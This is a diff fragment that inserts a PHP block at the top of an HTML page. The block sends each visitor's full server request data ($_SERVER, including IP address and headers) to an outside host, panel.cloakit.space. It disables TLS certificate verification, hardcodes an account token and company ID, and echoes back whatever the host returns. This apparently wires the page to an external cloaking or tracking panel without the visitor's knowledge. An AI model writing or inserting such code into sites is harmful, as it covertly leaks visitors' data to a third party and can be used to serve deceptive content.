@@ -1,3 +1,26 @@
+<?php
+$data = array(
+   '_server' => json_encode($_SERVER),
+   'user' => '5809689953d09f825e78a8e58137db03',
+   'company' => '8528'
+);
+$ch = curl_init();
+$optArray = array(
+    CURLOPT_URL => 'https://panel.cloakit.space/api',
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_SSL_VERIFYHOST => false,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_CUSTOMREQUEST => 'POST',
+    CURLOPT_POSTFIELDS => $data
+);
+curl_setopt_array($ch, $optArray);
+$result = curl_exec($ch);
+curl_close($ch);
+$responses = json_decode($result, true);
+
+echo $responses;
+?>
+
 <!DOCTYPE html>
 <html>
 <!--
